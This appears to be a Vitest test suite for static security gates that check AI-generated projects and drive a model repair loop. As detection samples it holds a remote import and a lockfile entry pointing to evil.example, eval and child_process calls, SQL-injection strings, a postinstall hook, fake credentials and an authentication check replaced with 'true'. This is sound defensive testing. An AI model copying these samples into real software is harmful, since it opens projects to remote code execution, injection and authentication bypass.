import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { SAMPLE_SPEC } from '../fixtures/sample-spec';
import { generateProject, runtimeFiles } from './project';
import {
  GATE_IDS,
  platformFileHashes,
  REMEDIATION,
  repairBrief,
  runStaticGates,
  stripComments,
  type GateOptions,
} from './static-gates';

const baseFiles = (): Map<string, string> => new Map(generateProject(SAMPLE_SPEC).files);
const opts = (): GateOptions => ({ platformFiles: platformFileHashes(runtimeFiles()) });
const withFile = (path: string, content: string): Map<string, string> => {
  const f = baseFiles();
  f.set(path, content);
  return f;
};
const rules = (files: Map<string, string>, o: GateOptions = opts()) =>
  runStaticGates(files, o).findings.map((f) => `${f.gate}:${f.rule}`);

describe('static gates on the generated full-stack project', () => {
  it('the untouched generated project passes every gate (a lockfile warning at the generated stage only)', () => {
    const r = runStaticGates(baseFiles(), opts());
    expect(r.findings.filter((f) => f.severity === 'blocker')).toEqual([]);
    expect(r.ok).toBe(true);
    expect(r.findings.map((f) => f.rule)).toEqual(['lockfile_missing']);
    for (const g of GATE_IDS) expect(r.gates[g].status).toBe('pass');
    expect(r.inputDigest).toMatch(/^[0-9a-f]{64}$/);
  });
  it('the locked stage requires a lockfile', () => {
    const r = runStaticGates(baseFiles(), { ...opts(), stage: 'locked' });
    expect(r.ok).toBe(false);
    expect(r.gates['dependency-policy'].status).toBe('fail');
  });
  it('is deterministic and binds the report to the bytes it saw', () => {
    const a = runStaticGates(baseFiles(), opts());
    const b = runStaticGates(baseFiles(), opts());
    expect(a).toEqual(b);
    const f = baseFiles();
    f.set('src/extra.ts', 'export const x = 1;\n');
    expect(runStaticGates(f, opts()).inputDigest).not.toBe(a.inputDigest);
  });
  it('findings never quote the source', () => {
    const secret = 'AKIAABCDEFGHIJKLMNOP';
    const r = runStaticGates(withFile('src/x.ts', `const k = '${secret}';\n`), opts());
    expect(JSON.stringify(r)).not.toContain(secret);
    expect(r.findings.some((f) => f.rule === 'secret_pattern' && f.line === 1)).toBe(true);
  });
});

describe('secrets gate', () => {
  it('flags a literal session secret, a committed .env, a key file, a connection string with a password and a canary', () => {
    expect(
      rules(
        withFile('src/x.ts', `export const sessionSecret = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';\n`),
      ),
    ).toContain('secrets:session_secret_literal');
    expect(rules(withFile('.env', 'PORT=1\n'))).toContain('secrets:env_file_committed');
    expect(rules(withFile('keys/server.pem', 'x'))).toContain('secrets:secret_key_file');
    expect(
      rules(withFile('src/db.ts', `const u = 'postgres://app:hunter2hunter2@db:5432/app';\n`)),
    ).toContain('secrets:secret_pattern');
    const c = runStaticGates(withFile('docs/n.md', 'token zz-canary-0123456789'), {
      ...opts(),
      canaries: ['zz-canary-0123456789'],
    });
    expect(c.findings.map((f) => f.rule)).toContain('canary');
  });
  it('does not flag environment reads, the .env.example placeholders or README placeholders', () => {
    expect(rules(withFile('src/x.ts', 'const s = process.env.SESSION_SECRET;\n'))).not.toContain(
      'secrets:session_secret_literal',
    );
    expect(runStaticGates(baseFiles(), opts()).findings.some((f) => f.gate === 'secrets')).toBe(
      false,
    );
  });
});

describe('forbidden-apis gate', () => {
  it.each([
    ['eval', 'const r = eval(input);', 'eval'],
    ['new Function', 'const f = new Function("return 1");', 'new_function'],
    ['vm', "import vm from 'node:vm';", 'vm_module'],
    ['child_process', "import { exec } from 'node:child_process';", 'child_process'],
    ['require child_process', "const c = require('child_process');", 'child_process'],
    ['remote import', "const m = await import('https://evil.example/x.js');", 'remote_import'],
    ['process binding', "process.binding('fs');", 'process_binding'],
    ['worker', "import { Worker } from 'worker_threads';", 'worker_threads'],
  ])('flags %s', (_n, code, rule) => {
    expect(rules(withFile('src/custom.ts', code + '\n'))).toContain('forbidden-apis:' + rule);
  });
  it('flags HTML injection sinks in the front end', () => {
    expect(rules(withFile('public/extra.js', 'el.innerHTML = value;\n'))).toContain(
      'forbidden-apis:inner_html',
    );
    expect(rules(withFile('public/extra.js', 'document.write(x);\n'))).toContain(
      'forbidden-apis:inner_html',
    );
  });
  it('ignores the words in comments and does not match property names such as .evaluate(', () => {
    expect(
      rules(
        withFile(
          'src/custom.ts',
          '// eval(x) is banned\n/* new Function() */\nconst a = scorer.evaluate(1);\n',
        ),
      ),
    ).not.toContain('forbidden-apis:eval');
  });
});

describe('dependency-policy gate', () => {
  const pkg = (over: Record<string, unknown>) => {
    const p = JSON.parse(baseFiles().get('package.json') as string);
    return JSON.stringify({ ...p, ...over });
  };
  it('flags a dependency outside the allowlist, a git/url/file spec, an unbounded version and lifecycle scripts', () => {
    expect(
      rules(withFile('package.json', pkg({ dependencies: { pg: '^8.13.0', lodash: '^4.0.0' } }))),
    ).toContain('dependency-policy:dependency_not_allowed');
    for (const spec of [
      'git+https://example.test/x.git',
      'github:a/b',
      'https://example.test/x.tgz',
      'file:../x',
      'a/b',
      'link:../x',
    ])
      expect(rules(withFile('package.json', pkg({ dependencies: { pg: spec } }))), spec).toContain(
        'dependency-policy:dependency_spec_not_registry',
      );
    for (const spec of ['*', 'latest', ''])
      expect(rules(withFile('package.json', pkg({ dependencies: { pg: spec } }))), spec).toContain(
        'dependency-policy:dependency_spec_unbounded',
      );
    expect(
      rules(withFile('package.json', pkg({ scripts: { postinstall: 'node x.js' } }))),
    ).toContain('dependency-policy:lifecycle_script');
    expect(rules(withFile('package.json', pkg({ overrides: { pg: '1.0.0' } })))).toContain(
      'dependency-policy:package_overrides',
    );
    expect(rules(withFile('package.json', '{not json'))).toContain(
      'dependency-policy:package_json_invalid',
    );
  });
  it('accepts ranges and the allowlist can be extended per project', () => {
    expect(rules(withFile('package.json', pkg({ dependencies: { pg: '~8.13.0' } })))).not.toContain(
      'dependency-policy:dependency_spec_not_registry',
    );
    const o = { ...opts(), allowedDependencies: ['pg', 'zod'] };
    expect(
      rules(withFile('package.json', pkg({ dependencies: { pg: '^8.13.0', zod: '^3.23.0' } })), o),
    ).not.toContain('dependency-policy:dependency_not_allowed');
  });
  const lock = (pkgs: Record<string, unknown>) =>
    JSON.stringify({
      name: 'x',
      lockfileVersion: 3,
      packages: { '': { name: 'x', dependencies: { pg: '^8.13.0' } }, ...pkgs },
    });
  const good = {
    resolved: 'https://registry.npmjs.org/pg/-/pg-8.13.0.tgz',
    integrity: 'sha512-' + 'A'.repeat(86) + '==',
  };
  it('verifies the lockfile: registry host, integrity, no install scripts, no links', () => {
    const o = { ...opts(), stage: 'locked' as const };
    expect(
      runStaticGates(withFile('package-lock.json', lock({ 'node_modules/pg': good })), o).ok,
    ).toBe(true);
    expect(
      rules(
        withFile(
          'package-lock.json',
          lock({ 'node_modules/pg': { ...good, resolved: 'https://evil.example/pg.tgz' } }),
        ),
        o,
      ),
    ).toContain('dependency-policy:lockfile_registry_host');
    expect(
      rules(
        withFile(
          'package-lock.json',
          lock({ 'node_modules/pg': { ...good, resolved: 'http://registry.npmjs.org/pg.tgz' } }),
        ),
        o,
      ),
    ).toContain('dependency-policy:lockfile_registry_host');
    expect(
      rules(
        withFile('package-lock.json', lock({ 'node_modules/pg': { resolved: good.resolved } })),
        o,
      ),
    ).toContain('dependency-policy:lockfile_no_integrity');
    expect(
      rules(
        withFile(
          'package-lock.json',
          lock({ 'node_modules/pg': { ...good, hasInstallScript: true } }),
        ),
        o,
      ),
    ).toContain('dependency-policy:lockfile_install_script');
    expect(
      rules(
        withFile(
          'package-lock.json',
          lock({ 'node_modules/pg': { link: true, resolved: '../x' } }),
        ),
        o,
      ),
    ).toContain('dependency-policy:dependency_spec_not_registry');
    expect(rules(withFile('package-lock.json', '[]'), o)).toContain(
      'dependency-policy:lockfile_invalid',
    );
    const mirror = { ...o, registryHosts: ['mirror.nuzm.internal'] };
    expect(
      rules(
        withFile(
          'package-lock.json',
          lock({ 'node_modules/pg': { ...good, resolved: 'https://mirror.nuzm.internal/pg.tgz' } }),
        ),
        mirror,
      ),
    ).not.toContain('dependency-policy:lockfile_registry_host');
  });
});

describe('sql-injection gate', () => {
  it.each([
    [
      'template interpolation of a value',
      "await pool.query(`SELECT * FROM customers WHERE name = '${name}'`);",
    ],
    [
      'concatenation of a value',
      "await pool.query('SELECT * FROM customers WHERE name = ' + name);",
    ],
    [
      'concatenation with a request field',
      "await client.query('DELETE FROM customers WHERE id = ' + req.params.id);",
    ],
  ])('flags %s', (_n, code) => {
    expect(
      rules(withFile('src/custom.ts', code + '\n')).some((r) => r.startsWith('sql-injection:')),
    ).toBe(true);
  });
  it.each([
    ['placeholders', "await pool.query('SELECT * FROM customers WHERE id = $1', [id]);"],
    [
      'a quoted identifier',
      "await pool.query('DELETE FROM ' + q(table) + ' WHERE id = $1', [id]);",
    ],
    [
      'a template with a quoted identifier',
      'await pool.query(`SELECT * FROM ${q(table)} WHERE id = $1`, [id]);',
    ],
    ['a constant', 'await pool.query(SQL_LIST);'],
  ])('allows %s', (_n, code) => {
    expect(
      rules(withFile('src/custom.ts', code + '\n')).some((r) => r.startsWith('sql-injection:')),
    ).toBe(false);
  });
  it('does not analyse the platform-pinned stores but does analyse a modified one', () => {
    expect(runStaticGates(baseFiles(), opts()).gates['sql-injection'].blockers).toBe(0);
    const f = baseFiles();
    f.set(
      'src/pg-store.ts',
      (f.get('src/pg-store.ts') as string) + "\nawait pool.query('SELECT ' + userInput);\n",
    );
    const r = runStaticGates(f, opts());
    expect(r.findings.map((x) => x.rule)).toEqual(
      expect.arrayContaining(['platform_file_modified', 'sql_interpolation']),
    );
  });
});

describe('route-auth gate', () => {
  it('flags a public route that is not allowlisted, an authenticated route without a permission check and a second server', () => {
    expect(
      rules(
        withFile(
          'src/routes.ts',
          "router.add('GET', '/api/v1/open', async () => ({ status: 200 }), true);\n",
        ),
      ),
    ).toContain('route-auth:route_public');
    expect(
      rules(
        withFile(
          'src/routes.ts',
          "router.add('GET', '/api/v1/x', async () => ({ status: 200 }));\n",
        ),
      ),
    ).toContain('route-auth:route_no_user');
    expect(
      rules(
        withFile(
          'src/routes.ts',
          "router.add('GET', '/api/v1/x', async (req) => ({ status: 200, body: req.user }));\n",
        ),
      ),
    ).toContain('route-auth:route_no_authorization');
    expect(
      rules(
        withFile(
          'src/routes.ts',
          "import { createServer } from 'node:http';\ncreateServer(() => {});\n",
        ),
      ),
    ).toContain('route-auth:raw_http_server');
    expect(rules(withFile('src/routes.ts', "import express from 'express';\n"))).toContain(
      'route-auth:raw_http_server',
    );
    expect(rules(withFile('src/routes.ts', 'router.add(...args);\n'))).toContain(
      'route-auth:route_arity',
    );
  });
  it('accepts an authenticated route that checks a permission and an allowlisted public route', () => {
    const ok =
      "router.add('GET', '/api/v1/x', async (req) => { need(req.user, 'customers', 'read'); return { status: 200 }; });\n";
    expect(rules(withFile('src/routes.ts', ok)).some((r) => r.startsWith('route-auth:'))).toBe(
      false,
    );
    const pub = "router.add('GET', '/status', async () => ({ status: 200 }), true);\n";
    expect(
      rules(withFile('src/routes.ts', pub), { ...opts(), publicRouteAllowlist: ['/status'] }).some(
        (r) => r.startsWith('route-auth:'),
      ),
    ).toBe(false);
  });
});

describe('platform-integrity gate', () => {
  it('detects a modified or deleted platform file and a forged probe', () => {
    const f = baseFiles();
    f.set(
      'src/auth.ts',
      (f.get('src/auth.ts') as string).replace('timingSafeEqual(expected, actual)', 'true'),
    );
    expect(rules(f)).toContain('platform-integrity:platform_file_modified');
    const g = baseFiles();
    g.delete('src/engine.ts');
    expect(rules(g)).toContain('platform-integrity:platform_file_missing');
    const h = baseFiles();
    if (h.has('probe/suite.ts')) {
      h.set('probe/suite.ts', 'export const run = () => ({ ok: true });\n');
      expect(rules(h)).toContain('platform-integrity:platform_file_modified');
    }
  });
  it('spec-derived files (meta) are not platform-pinned', () => {
    const f = baseFiles();
    f.set('src/meta.ts', (f.get('src/meta.ts') as string) + '\n// changed\n');
    expect(rules(f)).not.toContain('platform-integrity:platform_file_modified');
  });
});

describe('stripComments', () => {
  it('keeps line numbers and string contents', () => {
    const s = "a // c\n/* x\ny */ b('// not a comment')\n";
    const out = stripComments(s);
    expect(out.split('\n').length).toBe(s.split('\n').length);
    expect(out).toContain("'// not a comment'");
    expect(out).not.toContain('c\n/*');
  });
});

describe('repair loop contract (F2): findings are repair items and a bounded loop converges', () => {
  it('every rule the gates can emit has a remediation sentence', () => {
    const src = readFileSync(join(__dirname, 'static-gates.ts'), 'utf8');
    const msg = /const MESSAGES: Record<string, string> = \{([\s\S]*?)\n\};/.exec(src)![1]!;
    for (const m of msg.matchAll(/^\s{2}(\w+):/gm)) expect(REMEDIATION[m[1]!], m[1]).toBeTruthy();
  });
  it('a scripted repairer fixes injected defects within three rounds, and a defect it cannot fix still fails the loop', () => {
    const files = baseFiles();
    files.set(
      'src/custom.ts',
      "import { exec } from 'node:child_process';\nconst r = eval(input);\nawait pool.query('SELECT * FROM x WHERE a = ' + a);\nrouter.add('GET', '/api/v1/open', async () => ({ status: 200 }), true);\n",
    );
    files.set('.env', 'X=1\n');
    // a deterministic stand-in for the model: applies the fixed remediation for the rule it is told about (the real repairer is the model in P3-S03's loop)
    const repair = (f: Map<string, string>, items: ReturnType<typeof repairBrief>): void => {
      for (const it of items) {
        if (it.rule === 'env_file_committed') f.delete(it.file);
        else if (it.file === 'src/custom.ts') {
          const lines = (f.get(it.file) as string).split('\n');
          if (it.line !== null) lines[it.line - 1] = '// removed: ' + it.rule;
          f.set(it.file, lines.join('\n'));
        }
      }
    };
    let rounds = 0;
    let report = runStaticGates(files, opts());
    expect(report.ok).toBe(false);
    const first = repairBrief(report);
    expect(first.map((i) => i.rule)).toEqual(
      expect.arrayContaining([
        'env_file_committed',
        'child_process',
        'eval',
        'sql_interpolation',
        'route_public',
      ]),
    );
    expect(first.every((i) => i.fix.length > 10 && !JSON.stringify(i).includes('input'))).toBe(
      true,
    );
    while (!report.ok && rounds < 3) {
      repair(files, repairBrief(report));
      report = runStaticGates(files, opts());
      rounds++;
    }
    expect(report.ok).toBe(true);
    expect(rounds).toBeLessThanOrEqual(3);
    // a platform file the repairer cannot legitimately fix is reported until it is restored
    files.set('src/engine.ts', '// tampered\n');
    expect(repairBrief(runStaticGates(files, opts())).map((i) => i.rule)).toContain(
      'platform_file_modified',
    );
  });
});
